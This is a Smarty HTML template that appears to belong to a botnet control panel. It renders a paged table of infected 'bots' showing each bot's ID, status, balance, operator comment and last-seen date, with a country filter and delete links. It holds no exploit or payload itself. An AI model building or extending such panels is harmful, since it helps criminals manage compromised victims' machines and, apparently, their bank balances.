<div class="top_menu">

<div class="top_menu_left">
<b>{$lang.system}: {$system->name}</b>
</div>

<div class="top_menu_right">
<a href="/bots/index.html" onclick="return get_hax({ldelim}url:'/bots/index.html?ajax=1',method:'get',id:'content'{rdelim});">{$lang.nksc}</a>&nbsp;
</div>

</div>
<hr />

<br />

<div style="font-size:10px; position:relative" align="center">
<div style="position:absolute; left: 0px; top:10px">{$lang.mbns}: {$_SESSION.user->config.cp.bots_country}</div>
&nbsp;{$pages}&nbsp;
<div style="position:absolute; right: 0px; top:10px">{$lang.vsbo}: {$counts}</div>
</div>
<br />
<form action="#" name="groups" >
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 33%; text-align: center">{$lang.pref}</td>
<td style="width: 2%; text-align: center"></td>
<td style="width: 15%; text-align: center">{$lang.balance}</td>
<td style="width: 30%; text-align: center">{$lang.comm}</td>
<td style="width: 20%; text-align: center">{$lang.posken}</td>
<td style="width: 1px;"></td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr id="tr_{$key}" class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;">
<th onclick="gbw('{$item->id}');"  class="{$item->label}">{$item->prefix}{$item->uid}</th>
<th onclick="gbw('{$item->id}');">{$item|get_stat}</th>
<th onclick="gbw('{$item->id}');">{$item->balance}</th>
<th style="{if $item->comment|strpos:"!" ne 0}color:#F00{/if}" onclick="return false;" id="cg_{$item->prefix}{$item->uid}" ondblclick="edit_comment(this, 'groups', '{$item->system}');">{$item->comment}</th>
<th onclick="gbw('{$item->id}');">{$item->last_date}</th>
<th><a href="#" onclick="if(confirm('Точно удалить \'{$item->prefix}{$item->uid}\'?')) get_hax({ldelim}url: '/bots/bot-{$item->prefix}{$item->uid}.html?ajax=1&amp;z={$item->system}&amp;page={$Cur.page}&amp;x=delete',method: 'get',id: 'content'{rdelim});"><img src="/images/delete.png" alt="{$lang.delet}" title="{$lang.delet}" border="0" /></a></th>
</tr>
{/foreach}
</table>
</form>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>